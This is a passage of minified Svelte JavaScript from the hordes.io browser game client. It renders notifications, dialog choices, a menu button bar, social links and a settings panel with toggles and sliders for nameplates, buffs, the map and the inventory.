                    1 & i && Et(n, 1)) : (n = $$(t),
                        n.c(),
                        Et(n, 1),
                        n.m(e, s)) : n && ($t(),
                            Mt(n, 1, 1, () => {
                                n = null
                            }
                            ),
                            St()),
                    t[0].error ? a ? (a.p(t, i),
                        1 & i && Et(a, 1)) : (a = S$(t),
                            a.c(),
                            Et(a, 1),
                            a.m(e, null)) : a && ($t(),
                                Mt(a, 1, 1, () => {
                                    a = null
                                }
                                ),
                                St())
            },
            i(t) {
                i || (Et(n),
                    Et(a),
                    i = !0)
            },
            o(t) {
                Mt(n),
                    Mt(a),
                    i = !1
            },
            d(t) {
                t && _(e),
                    n && n.d(),
                    a && a.d()
            }
        }
    }
    function M$(t, e, s) {
        let i = {}
            , n = {};
        return Vt.subscribe(t => {
            s(0, i[t.type] = t.text, i),
                n[t.type] && clearTimeout(n[t.type]),
                n[t.type] = setTimeout(() => {
                    s(0, i[t.type] = void 0, i)
                }
                    , t.time || 1e3)
        }
        ),
            [i]
    }
    class _$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, M$, E$, h, {})
        }
    }
    function C$(t, e, s) {
        const i = t.slice();
        return i[6] = e[s],
            i
    }
    function T$(t) {
        let e, s, i, n;
        const a = new Sb({
            props: {
                title: "Request",
                close: !1,
                $$slots: {
                    default: [I$]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return {
            c() {
                e = T("div"),
                    Ft(a.$$.fragment),
                    B(e, "class", "absCentered container svelte-cy0tay")
            },
            m(s, r, o) {
                M(s, e, r),
                    Zt(a, e, null),
                    i = !0,
                    o && n(),
                    n = A(e, "outroend", t[5])
            },
            p(t, e) {
                const s = {};
                518 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    a.$set(s)
            },
            i(t) {
                i || (Et(a.$$.fragment, t),
                    ut(() => {
                        s || (s = Tt(e, dm, {
                            duration: 100
                        }, !0)),
                            s.run(1)
                    }
                    ),
                    i = !0)
            },
            o(t) {
                Mt(a.$$.fragment, t),
                    s || (s = Tt(e, dm, {
                        duration: 100
                    }, !1)),
                    s.run(0),
                    i = !1
            },
            d(t) {
                t && _(e),
                    Ut(a),
                    t && s && s.end(),
                    n()
            }
        }
    }
    function P$(t) {
        let e, s, i, n, a, r = t[6].text + "", o = t[6].nocombat && t[2].combat ? " (Must leave combat)" : "";
        function l(...e) {
            return t[4](t[6], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = P(r),
                    i = P(o),
                    B(e, "class", n = "choice " + (t[6].nocombat && t[2].combat ? "nocombat textgrey" : "") + " svelte-cy0tay")
            },
            m(t, n, r) {
                M(t, e, n),
                    E(e, s),
                    E(e, i),
                    r && a(),
                    a = A(e, "click", l)
            },
            p(a, l) {
                t = a,
                    2 & l && r !== (r = t[6].text + "") && F(s, r),
                    6 & l && o !== (o = t[6].nocombat && t[2].combat ? " (Must leave combat)" : "") && F(i, o),
                    6 & l && n !== (n = "choice " + (t[6].nocombat && t[2].combat ? "nocombat textgrey" : "") + " svelte-cy0tay") && B(e, "class", n)
            },
            d(t) {
                t && _(e),
                    a()
            }
        }
    }
    function I$(t) {
        let e, s, i, n, a = t[1][0].title + "", r = t[1][0].text + "", o = t[1][0].choices, l = [];
        for (let e = 0; e < o.length; e += 1)
            l[e] = P$(C$(t, o, e));
        return {
            c() {
                e = T("div"),
                    s = T("h3"),
                    i = P(a),
                    n = T("p");
                for (let t = 0; t < l.length; t += 1)
                    l[t].c();
                B(s, "class", "textprimary"),
                    B(e, "class", "container svelte-cy0tay")
            },
            m(t, a) {
                M(t, e, a),
                    E(e, s),
                    E(s, i),
                    E(e, n),
                    n.innerHTML = r;
                for (let t = 0; t < l.length; t += 1)
                    l[t].m(e, null)
            },
            p(t, s) {
                if (2 & s && a !== (a = t[1][0].title + "") && F(i, a),
                    2 & s && r !== (r = t[1][0].text + "") && (n.innerHTML = r),
                    14 & s) {
                    let i;
                    for (o = t[1][0].choices,
                        i = 0; i < o.length; i += 1) {
                        const n = C$(t, o, i);
                        l[i] ? l[i].p(n, s) : (l[i] = P$(n),
                            l[i].c(),
                            l[i].m(e, null))
                    }
                    for (; i < l.length; i += 1)
                        l[i].d(1);
                    l.length = o.length
                }
            },
            d(t) {
                t && _(e),
                    C(l, t)
            }
        }
    }
    function D$(t) {
        let e, s, i = t[1].length && !t[0] && T$(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[1].length && !t[0] ? i ? (i.p(t, s),
                    3 & s && Et(i, 1)) : (i = T$(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function A$(t, e, s) {
        let i, n;
        m(t, Yt, t => s(1, i = t)),
            m(t, ne, t => s(2, n = t));
        let a = !1;
        const r = async t => {
            t && await t(),
                Yt.update(t => (t.shift(),
                    t)),
                s(0, a = !0)
        }
            , o = t => {
                r(t.fun)
            }
            , l = () => {
                s(0, a = !1)
            }
            ;
        return [a, i, n, r, o, l]
    }
    class B$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, A$, D$, h, {})
        }
    }
    function R$(t) {
        let e, s, i, n = t[0][0].text + "", a = t[0][0].icon && z$(t);
        return {
            c() {
                e = T("div"),
                    a && a.c(),
                    s = T("div"),
                    B(e, "class", "notification panel-black border grey svelte-9nlpzp")
            },
            m(r, o, l) {
                M(r, e, o),
                    a && a.m(e, null),
                    E(e, s),
                    s.innerHTML = n,
                    l && i(),
                    i = A(e, "click", t[2])
            },
            p(t, i) {
                t[0][0].icon ? a ? a.p(t, i) : (a = z$(t),
                    a.c(),
                    a.m(e, s)) : a && (a.d(1),
                        a = null),
                    1 & i && n !== (n = t[0][0].text + "") && (s.innerHTML = n)
            },
            d(t) {
                t && _(e),
                    a && a.d(),
                    i()
            }
        }
    }
    function z$(t) {
        let e, s, i;
        return {
            c() {
                e = T("img"),
                    B(e, "class", s = "icon " + t[0][0].css + " svelte-9nlpzp"),
                    e.src !== (i = "/assets/ui/" + t[0][0].icon) && B(e, "src", i)
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, n) {
                1 & n && s !== (s = "icon " + t[0][0].css + " svelte-9nlpzp") && B(e, "class", s),
                    1 & n && e.src !== (i = "/assets/ui/" + t[0][0].icon) && B(e, "src", i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function F$(t) {
        let e, s = t[0].length && !t[1] && R$(t);
        return {
            c() {
                s && s.c(),
                    e = D()
            },
            m(t, i) {
                s && s.m(t, i),
                    M(t, e, i)
            },
            p(t, [i]) {
                t[0].length && !t[1] ? s ? s.p(t, i) : (s = R$(t),
                    s.c(),
                    s.m(e.parentNode, e)) : s && (s.d(1),
                        s = null)
            },
            i: i,
            o: i,
            d(t) {
                s && s.d(t),
                    t && _(e)
            }
        }
    }
    function Z$(t, e, s) {
        let i, n;
        return m(t, Xt, t => s(0, i = t)),
            m(t, ee, t => s(1, n = t)),
            [i, n, () => {
                Xt.update(t => (t.shift(),
                    t))
            }
            ]
    }
    class U$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Z$, F$, h, {})
        }
    }
    function L$(t, e, s) {
        const i = t.slice();
        return i[5] = e[s],
            i
    }
    function N$(t) {
        let e, s;
        return {
            c() {
                e = T("div"),
                    s = P(t[0]),
                    B(e, "class", "btn border grey")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                1 & e && F(s, t[0])
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function O$(t) {
        let e, s, i, n, a;
        function r(...e) {
            return t[2](t[5], ...e)
        }
        function o(...e) {
            return t[4](t[5], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = T("img"),
                    B(s, "class", "svgicon"),
                    s.src !== (i = "/assets/ui/icons/" + t[5].img + ".svg?v=4002247") && B(s, "src", i),
                    B(e, "id", n = "sys" + t[5].img),
                    B(e, "class", "btn border black")
            },
            m(i, n, c) {
                M(i, e, n),
                    E(e, s),
                    c && l(a),
                    a = [A(e, "mouseenter", r), A(e, "mouseleave", t[3]), A(e, "click", o)]
            },
            p(e, s) {
                t = e
            },
            d(t) {
                t && _(e),
                    l(a)
            }
        }
    }
    function j$(t) {
        let e, s, n = "" !== t[0] && N$(t), a = t[1], r = [];
        for (let e = 0; e < a.length; e += 1)
            r[e] = O$(L$(t, a, e));
        return {
            c() {
                e = T("div"),
                    n && n.c(),
                    s = D();
                for (let t = 0; t < r.length; t += 1)
                    r[t].c();
                B(e, "class", "btnbar svelte-133q4bd")
            },
            m(t, i) {
                M(t, e, i),
                    n && n.m(e, null),
                    E(e, s);
                for (let t = 0; t < r.length; t += 1)
                    r[t].m(e, null)
            },
            p(t, [i]) {
                if ("" !== t[0] ? n ? n.p(t, i) : (n = N$(t),
                    n.c(),
                    n.m(e, s)) : n && (n.d(1),
                        n = null),
                    3 & i) {
                    let s;
                    for (a = t[1],
                        s = 0; s < a.length; s += 1) {
                        const n = L$(t, a, s);
                        r[s] ? r[s].p(n, i) : (r[s] = O$(n),
                            r[s].c(),
                            r[s].m(e, null))
                    }
                    for (; s < r.length; s += 1)
                        r[s].d(1);
                    r.length = a.length
                }
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    n && n.d(),
                    C(r, t)
            }
        }
    }
    function q$(t, e, s) {
        let i = "";
        const n = (t, e) => s(0, i = t.desc)
            , a = t => s(0, i = "");
        return [i, [{
            img: "gem",
            store: us,
            desc: "Elixir"
        }, {
            img: "char",
            store: gs,
            desc: "Character"
        }, {
            img: "book",
            store: cs,
            desc: "Skills"
        }, {
            img: "bag",
            store: os,
            desc: "Inventory"
        }, {
            img: "clan",
            store: ms,
            desc: "Clan"
        }, {
            img: "trophy",
            store: hs,
            desc: "DPS Meter"
        }, {
            img: "cog",
            store: ls,
            desc: "Settings"
        }, {
            img: "fullscreen",
            fun: () => {
                document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen()
            }
            ,
            desc: "Fullscreen"
        }, {
            img: "back",
            fun: () => {
                document.location.href = "/"
            }
            ,
            desc: "Back to Menu"
        }], n, a, (t, e) => {
            t.fun ? t.fun() : t.store.update(t => !t)
        }
        ]
    }
    class X$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, q$, j$, h, {})
        }
    }
    function H$(t) {
        let e, s, n, a, r, o, l;
        return {
            c() {
                e = T("div"),
                    s = T("a"),
                    s.innerHTML = '<img class="svgicon" src="/assets/ui/icons/instagram.svg?v=4002247">',
                    n = T("a"),
                    n.innerHTML = '<img class="svgicon" src="/assets/ui/icons/reddit.svg?v=4002247">',
                    a = T("a"),
                    a.innerHTML = '<img class="svgicon" src="/assets/ui/icons/discord.svg?v=4002247">',
                    r = T("a"),
                    r.innerHTML = '<img class="svgicon" src="/assets/ui/icons/twitter.svg?v=4002247">',
                    o = T("div"),
                    o.innerHTML = '<img class="svgicon" src="/assets/ui/icons/twitch.svg?v=4002247">',
                    B(s, "class", "btn border black"),
                    B(s, "target", "_blank"),
                    B(s, "rel", "noopener noreferrer"),
                    B(s, "href", "https://www.instagram.com/hordesio.official"),
                    B(n, "class", "btn border black"),
                    B(n, "target", "_blank"),
                    B(n, "rel", "noopener noreferrer"),
                    B(n, "href", "https://www.reddit.com/r/Hordesio"),
                    B(a, "class", "btn border black"),
                    B(a, "target", "_blank"),
                    B(a, "rel", "noopener noreferrer"),
                    B(a, "href", "https://discord.gg/hordes"),
                    B(r, "class", "btn border black"),
                    B(r, "target", "_blank"),
                    B(r, "rel", "noopener noreferrer"),
                    B(r, "href", "https://twitter.com/hordesio"),
                    B(o, "class", "btn border black"),
                    B(e, "class", "btnbar svelte-1wol45y")
            },
            m(i, c, h) {
                M(i, e, c),
                    E(e, s),
                    E(e, n),
                    E(e, a),
                    E(e, r),
                    E(e, o),
                    h && l(),
                    l = A(o, "click", t[1])
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    l()
            }
        }
    }
    function K$(t, e, s) {
        let i;
        m(t, ds, t => s(0, i = t));
        const n = t => y(ds, i = !i);
        return [i, n]
    }
    class W$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, K$, H$, h, {})
        }
    }
    function Y$(t) {
        let e, s, n;
        return {
            c() {
                e = T("div"),
                    B(e, "class", s = "btn checkbox " + (t[2] ? "active" : ""))
            },
            m(s, i, a) {
                M(s, e, i),
                    a && n(),
                    n = A(e, "click", t[3])
            },
            p(t, [i]) {
                4 & i && s !== (s = "btn checkbox " + (t[2] ? "active" : "")) && B(e, "class", s)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    n()
            }
        }
    }
    function V$(t, e, s) {
        let n, a = i, r = () => (a(),
            a = u(o, t => s(2, n = t)),
            o);
        t.$$.on_destroy.push(() => a());
        let { store: o } = e;
        r();
        let { cb: l } = e;
        const c = t => {
            y(o, n = !n),
                l && l(n)
        }
            ;
        return t.$set = t => {
            "store" in t && r(s(0, o = t.store)),
                "cb" in t && s(1, l = t.cb)
        }
            ,
            [o, l, n, c]
    }
    class G$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, V$, Y$, h, {
                    store: 0,
                    cb: 1
                })
        }
    }
    function Q$(t, e, s) {
        const i = t.slice();
        return i[63] = e[s],
            i[65] = s,
            i
    }
    function J$(t, e, s) {
        const i = t.slice();
        return i[60] = e[s],
            i
    }
    function tS(t, e, s) {
        const i = t.slice();
        return i[57] = e[s],
            i
    }
    function eS(t, e, s) {
        const i = t.slice();
        return i[66] = e[s],
            i
    }
    function sS(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: Xi.ui.settings.name,
                icon: "cog",
                $$slots: {
                    default: [uS]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[56]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "container svelte-15b6qta")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                33554419 & e[0] | 128 & e[2] && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function iS(t) {
        let e, s, i, n, a = t[66].name + "";
        function r(...e) {
            return t[29](t[66], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = P(a),
                    B(e, "class", i = "choice " + (t[66] == t[1] ? "active" : ""))
            },
            m(t, i, a) {
                M(t, e, i),
                    E(e, s),
                    a && n(),
                    n = A(e, "click", r)
            },
            p(s, n) {
                t = s,
                    2 & n[0] && i !== (i = "choice " + (t[66] == t[1] ? "active" : "")) && B(e, "class", i)
            },
            d(t) {
                t && _(e),
                    n()
            }
        }
    }
    function nS(t) {
        let e, s, i, n, a;
        const r = new G$({
            props: {
                store: Ps
            }
        });
        let o = Xi.ui.chat.types
            , l = [];
        for (let e = 0; e < o.length; e += 1)
            l[e] = cS(Q$(t, o, e));
        return {
            c() {
                e = T("div"),
                    e.textContent = "" + Xi.ui.settings.chatbubbles,
                    Ft(r.$$.fragment),
                    s = T("div"),
                    s.textContent = "" + Xi.ui.settings.combatlog,
                    i = T("div");
                for (let t = 0; t < l.length; t += 1)
                    l[t].c();
                n = D(),
                    B(s, "class", "textprimary")
            },
            m(t, o) {
                M(t, e, o),
                    Zt(r, t, o),
                    M(t, s, o),
                    M(t, i, o);
                for (let e = 0; e < l.length; e += 1)
                    l[e].m(t, o);
                M(t, n, o),
                    a = !0
            },
            p(t, e) {
                if (16777216 & e[0]) {
                    let s;
                    for (o = Xi.ui.chat.types,
                        s = 0; s < o.length; s += 1) {
                        const i = Q$(t, o, s);
                        l[s] ? l[s].p(i, e) : (l[s] = cS(i),
                            l[s].c(),
                            l[s].m(n.parentNode, n))
                    }
                    for (; s < l.length; s += 1)
                        l[s].d(1);
                    l.length = o.length
                }
            },
            i(t) {
                a || (Et(r.$$.fragment, t),
                    a = !0)
            },
            o(t) {
                Mt(r.$$.fragment, t),
                    a = !1
            },
            d(t) {
                t && _(e),
                    Ut(r, t),
                    t && _(s),
                    t && _(i),
                    C(l, t),
                    t && _(n)
            }
        }
    }
    function aS(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g, v, y, b, w, x, k, $, S, D, z, U, N, O, j, q, X, H, K, W, Y, V, G, Q, J, tt, et, st, it, nt, at, rt, ot, lt, ct, ht, dt, mt, pt, ft, gt, vt, yt, bt, wt, xt, kt, $t, St, _t, Ct, Tt, Pt, It, Dt, At, Bt, Rt, zt, Lt, Nt, Ot, jt, qt, Xt, Ht, Kt, Wt, Yt, Vt, Gt, Qt, Jt, te, ee, se, ie, ne, ae, re, oe, le, ce, he, de, ue, me, pe, fe, ge, ve = Xi.ui.settings.language + "", ye = t[15].toFixed(1) + "", be = t[16].toFixed(1) + "", we = Xi.ui.settings.invwidth + "", xe = Xi.ui.settings.stashwidth + "", ke = Xi.ui.settings.stashheight + "", $e = t[26], Se = [];
        for (let e = 0; e < $e.length; e += 1)
            Se[e] = hS(J$(t, $e, e));
        const Ee = new G$({
            props: {
                store: Fs
            }
        })
            , Me = new G$({
                props: {
                    store: ks
                }
            })
            , _e = new G$({
                props: {
                    store: Es
                }
            })
            , Ce = new G$({
                props: {
                    store: Ss
                }
            })
            , Te = new G$({
                props: {
                    store: Ms
                }
            })
            , Pe = new G$({
                props: {
                    store: $s
                }
            })
            , Ie = new G$({
                props: {
                    store: zs
                }
            })
            , De = new G$({
                props: {
                    store: Ds
                }
            })
            , Ae = new G$({
                props: {
                    store: Is
                }
            })
            , Be = new G$({
                props: {
                    store: As
                }
            })
            , Re = new G$({
                props: {
                    store: Us,
                    cb: t[27]
                }
            })
            , ze = new G$({
                props: {
                    store: Ls
                }
            })
            , Fe = new G$({
                props: {
                    store: Ys
                }
            })
            , Ze = new G$({
                props: {
                    store: js
                }
            })
            , Ue = new G$({
                props: {
                    store: Xs
                }
            })
            , Le = new G$({
                props: {
                    store: Hs
                }
            })
            , Ne = new G$({
                props: {
                    store: _s
                }
            })
            , Oe = new G$({
                props: {
                    store: Cs
                }
            });
        return {
            c() {
                e = T("div"),
                    s = P(ve),
                    i = I(),
                    n = T("br"),
                    a = T("small"),
                    a.textContent = "Requires reload",
                    r = T("select");
                for (let t = 0; t < Se.length; t += 1)
                    Se[t].c();
                o = T("div"),
                    o.textContent = "" + Xi.ui.settings.tutorial,
                    c = T("div"),
                    h = T("div"),
                    h.textContent = "Restart",
                    d = T("div"),
                    d.textContent = "" + Xi.ui.settings.resettutorial,
                    u = T("div"),
                    u.textContent = "Disable",
                    m = T("div"),
                    m.textContent = "" + Xi.ui.settings.disabletutorial,
                    p = T("div"),
                    p.textContent = "FPS / Ping",
                    f = T("div"),
                    g = T("div"),
                    g.textContent = "Show FPS / Ping",
                    Ft(Ee.$$.fragment),
                    v = T("div"),
                    v.textContent = "Nameplates",
                    y = T("div"),
                    b = T("div"),
                    b.textContent = "Draw range",
                    w = T("input"),
                    x = T("div"),
                    x.textContent = "Show monsters",
                    Ft(Me.$$.fragment),
                    k = T("div"),
                    k.textContent = "Show friendly bars",
                    Ft(_e.$$.fragment),
                    $ = T("div"),
                    $.textContent = "Always show level",
                    Ft(Ce.$$.fragment),
                    S = T("div"),
                    S.textContent = "Class color bars",
                    Ft(Te.$$.fragment),
                    D = T("div"),
                    D.textContent = "Transparency",
                    Ft(Pe.$$.fragment),
                    z = T("div"),
                    z.textContent = "Drops",
                    U = T("div"),
                    N = T("div"),
                    N.textContent = "Show Drop Quality %",
                    Ft(Ie.$$.fragment),
                    O = T("div"),
                    j = P("Drop Quality Minimum"),
                    q = T("br"),
                    X = T("small"),
                    H = P(t[14]),
                    K = P("%"),
                    W = T("input"),
                    Y = T("div"),
                    Y.textContent = "Damage & Healing",
                    V = T("div"),
                    G = T("div"),
                    G.textContent = "Incoming damage",
                    Ft(De.$$.fragment),
                    Q = T("div"),
                    Q.textContent = "Incoming healing",
                    Ft(Ae.$$.fragment),
                    J = T("div"),
                    J.textContent = "Incoming mana",
                    Ft(Be.$$.fragment),
                    tt = T("div"),
                    tt.textContent = "Icons & Buffs",
                    et = T("div"),
                    st = T("div"),
                    st.innerHTML = 'Cooldown text (skills)<br><small class="textgrey">Requires reload</small>',
                    Ft(Re.$$.fragment),
                    it = T("div"),
                    it.textContent = "Cooldown text (buffs)",
                    Ft(ze.$$.fragment),
                    nt = T("div"),
                    nt.textContent = "Show your buffs only",
                    Ft(Fe.$$.fragment),
                    at = T("div"),
                    rt = P("Buff timeout flash interval"),
                    ot = T("br"),
                    lt = T("small"),
                    ct = P(ye),
                    ht = P("s"),
                    dt = T("input"),
                    mt = T("div"),
                    pt = P("Buff timeout flash duration"),
                    ft = T("br"),
                    gt = T("small"),
                    vt = P(be),
                    yt = P("s"),
                    bt = T("input"),
                    wt = T("div"),
                    wt.textContent = "Buff maximum",
                    xt = T("input"),
                    kt = T("div"),
                    kt.textContent = "Buff maximum (party)",
                    $t = T("input"),
                    St = T("div"),
                    St.textContent = "Limited party buff update rate",
                    Ft(Ze.$$.fragment),
                    _t = T("div"),
                    _t.textContent = "Unitframes",
                    Ct = T("div"),
                    Tt = T("div"),
                    Tt.textContent = "Show self in party",
                    Ft(Ue.$$.fragment),
                    Pt = T("div"),
                    Pt.textContent = "Party mana",
                    Ft(Le.$$.fragment),
                    It = T("div"),
                    It.textContent = "Party frame width",
                    Dt = T("input"),
                    At = T("div"),
                    At.textContent = "Map",
                    Bt = T("div"),
                    Rt = T("div"),
                    Rt.textContent = "" + Xi.ui.settings.mapshowmonsters,
                    Ft(Ne.$$.fragment),
                    zt = T("div"),
                    zt.textContent = "" + Xi.ui.settings.maplowqual,
                    Ft(Oe.$$.fragment),
                    Lt = T("div"),
                    Lt.textContent = "" + Xi.ui.inventory.name,
                    Nt = T("div"),
                    Ot = T("div"),
                    jt = P("Protected item quality"),
                    qt = T("br"),
                    Xt = T("small"),
                    Ht = P(t[20]),
                    Kt = P("%"),
                    Wt = T("input"),
                    Yt = T("div"),
                    Vt = P(we),
                    Gt = T("br"),
                    Qt = T("small"),
                    Jt = P(t[21]),
                    te = T("input"),
                    ee = T("div"),
                    ee.textContent = "Stash",
                    se = T("div"),
                    ie = T("div"),
                    ne = P(xe),
                    ae = T("br"),
                    re = T("small"),
                    oe = P(t[22]),
                    le = T("input"),
                    ce = T("div"),
                    he = P(ke),
                    de = T("br"),
                    ue = T("small"),
                    me = P(t[23]),
                    pe = T("input"),
                    B(a, "class", "textgrey"),
                    void 0 === t[12] && ut(() => t[41].call(r)),
                    B(o, "class", "textprimary"),
                    B(d, "class", "btn blue"),
                    B(m, "class", "btn orange"),
                    B(p, "class", "textprimary"),
                    B(v, "class", "textprimary"),
                    B(w, "type", "range"),
                    B(z, "class", "textprimary"),
                    B(X, "class", "textgrey"),
                    B(W, "type", "range"),
                    B(W, "min", "0"),
                    B(W, "max", "100"),
                    B(Y, "class", "textprimary"),
                    B(tt, "class", "textprimary"),
                    B(lt, "class", "textgrey"),
                    B(dt, "type", "range"),
                    B(dt, "min", "0"),
                    B(dt, "max", "1"),
                    B(dt, "step", "0.1"),
                    B(gt, "class", "textgrey"),
                    B(bt, "type", "range"),
                    B(bt, "min", "0"),
                    B(bt, "max", "5"),
                    B(bt, "step", "0.1"),
                    B(xt, "placeholder", "14"),
                    B(xt, "type", "number"),
                    B(xt, "min", "0"),
                    B($t, "placeholder", "8"),
                    B($t, "type", "number"),
                    B($t, "min", "0"),
                    B(_t, "class", "textprimary"),
                    B(Dt, "type", "range"),
                    B(Dt, "min", "50"),
                    B(Dt, "max", "400"),
                    B(At, "class", "textprimary"),
                    B(Lt, "class", "textprimary"),
                    B(Xt, "class", "textgrey"),
                    B(Wt, "type", "range"),
                    B(Wt, "min", "0"),
                    B(Wt, "max", "100"),
                    B(Qt, "class", "textgrey"),
                    B(te, "type", "range"),
                    B(te, "min", "4"),
                    B(te, "max", "10"),
                    B(ee, "class", "textprimary"),
                    B(re, "class", "textgrey"),
                    B(le, "type", "range"),
                    B(le, "min", "6"),
                    B(le, "max", "20"),
                    B(ue, "class", "textgrey"),
                    B(pe, "type", "range"),
                    B(pe, "min", "50"),
                    B(pe, "max", "500")
            },
            m(_, C, T) {
                M(_, e, C),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a),
                    M(_, r, C);
                for (let t = 0; t < Se.length; t += 1)
                    Se[t].m(r, null);
                L(r, t[12]),
                    M(_, o, C),
                    M(_, c, C),
                    M(_, h, C),
                    M(_, d, C),
                    M(_, u, C),
                    M(_, m, C),
                    M(_, p, C),
                    M(_, f, C),
                    M(_, g, C),
                    Zt(Ee, _, C),
                    M(_, v, C),
                    M(_, y, C),
                    M(_, b, C),
                    M(_, w, C),
                    Z(w, t[13]),
                    M(_, x, C),
                    Zt(Me, _, C),
                    M(_, k, C),
                    Zt(_e, _, C),
                    M(_, $, C),
                    Zt(Ce, _, C),
                    M(_, S, C),
                    Zt(Te, _, C),
                    M(_, D, C),
                    Zt(Pe, _, C),
                    M(_, z, C),
                    M(_, U, C),
                    M(_, N, C),
                    Zt(Ie, _, C),
                    M(_, O, C),
                    E(O, j),
                    E(O, q),
                    E(O, X),
                    E(X, H),
                    E(X, K),
                    M(_, W, C),
                    Z(W, t[14]),
                    M(_, Y, C),
                    M(_, V, C),
                    M(_, G, C),
                    Zt(De, _, C),
                    M(_, Q, C),
                    Zt(Ae, _, C),
                    M(_, J, C),
                    Zt(Be, _, C),
                    M(_, tt, C),
                    M(_, et, C),
                    M(_, st, C),
                    Zt(Re, _, C),
                    M(_, it, C),
                    Zt(ze, _, C),
                    M(_, nt, C),
                    Zt(Fe, _, C),
                    M(_, at, C),
                    E(at, rt),
                    E(at, ot),
                    E(at, lt),
                    E(lt, ct),
                    E(lt, ht),
                    M(_, dt, C),
                    Z(dt, t[15]),
                    M(_, mt, C),
                    E(mt, pt),
                    E(mt, ft),
                    E(mt, gt),
                    E(gt, vt),
                    E(gt, yt),
                    M(_, bt, C),
                    Z(bt, t[16]),
                    M(_, wt, C),
                    M(_, xt, C),
                    Z(xt, t[17]),
                    M(_, kt, C),
                    M(_, $t, C),
                    Z($t, t[18]),
                    M(_, St, C),
                    Zt(Ze, _, C),
                    M(_, _t, C),
                    M(_, Ct, C),
                    M(_, Tt, C),
                    Zt(Ue, _, C),
                    M(_, Pt, C),
                    Zt(Le, _, C),
                    M(_, It, C),
                    M(_, Dt, C),
                    Z(Dt, t[19]),
                    M(_, At, C),
                    M(_, Bt, C),
                    M(_, Rt, C),
                    Zt(Ne, _, C),
                    M(_, zt, C),
                    Zt(Oe, _, C),
                    M(_, Lt, C),
                    M(_, Nt, C),
                    M(_, Ot, C),
                    E(Ot, jt),
                    E(Ot, qt),
                    E(Ot, Xt),
                    E(Xt, Ht),
                    E(Xt, Kt),
                    M(_, Wt, C),
                    Z(Wt, t[20]),
                    M(_, Yt, C),
                    E(Yt, Vt),
                    E(Yt, Gt),
                    E(Yt, Qt),
                    E(Qt, Jt),
                    M(_, te, C),
                    Z(te, t[21]),
                    M(_, ee, C),
                    M(_, se, C),
                    M(_, ie, C),
                    E(ie, ne),
                    E(ie, ae),
                    E(ie, re),
                    E(re, oe),
                    M(_, le, C),
                    Z(le, t[22]),
                    M(_, ce, C),
                    E(ce, he),
                    E(ce, de),
                    E(ce, ue),
                    E(ue, me),
                    M(_, pe, C),
                    Z(pe, t[23]),
                    fe = !0,
                    T && l(ge),
                    ge = [A(r, "change", t[41]), A(r, "change", t[27]), A(d, "click", t[42]), A(m, "click", t[43]), A(w, "change", t[44]), A(w, "input", t[44]), A(W, "change", t[45]), A(W, "input", t[45]), A(dt, "change", t[46]), A(dt, "input", t[46]), A(bt, "change", t[47]), A(bt, "input", t[47]), A(xt, "input", t[48]), A($t, "input", t[49]), A(Dt, "change", t[50]), A(Dt, "input", t[50]), A(Wt, "change", t[51]), A(Wt, "input", t[51]), A(te, "change", t[52]), A(te, "input", t[52]), A(le, "change", t[53]), A(le, "input", t[53]), A(pe, "change", t[54]), A(pe, "input", t[54])]
            },
            p(t, e) {
                if (67108864 & e[0]) {
                    let s;
                    for ($e = t[26],
                        s = 0; s < $e.length; s += 1) {
                        const i = J$(t, $e, s);
                        Se[s] ? Se[s].p(i, e) : (Se[s] = hS(i),
                            Se[s].c(),
                            Se[s].m(r, null))
                    }
                    for (; s < Se.length; s += 1)
                        Se[s].d(1);
                    Se.length = $e.length
                }
                4096 & e[0] && L(r, t[12]),
                    8192 & e[0] && Z(w, t[13]),
                    (!fe || 16384 & e[0]) && F(H, t[14]),
                    16384 & e[0] && Z(W, t[14]),
                    (!fe || 32768 & e[0]) && ye !== (ye = t[15].toFixed(1) + "") && F(ct, ye),
                    32768 & e[0] && Z(dt, t[15]),
                    (!fe || 65536 & e[0]) && be !== (be = t[16].toFixed(1) + "") && F(vt, be),
                    65536 & e[0] && Z(bt, t[16]),
                    131072 & e[0] && R(xt.value) !== t[17] && Z(xt, t[17]),
                    262144 & e[0] && R($t.value) !== t[18] && Z($t, t[18]),
                    524288 & e[0] && Z(Dt, t[19]),
                    (!fe || 1048576 & e[0]) && F(Ht, t[20]),
                    1048576 & e[0] && Z(Wt, t[20]),
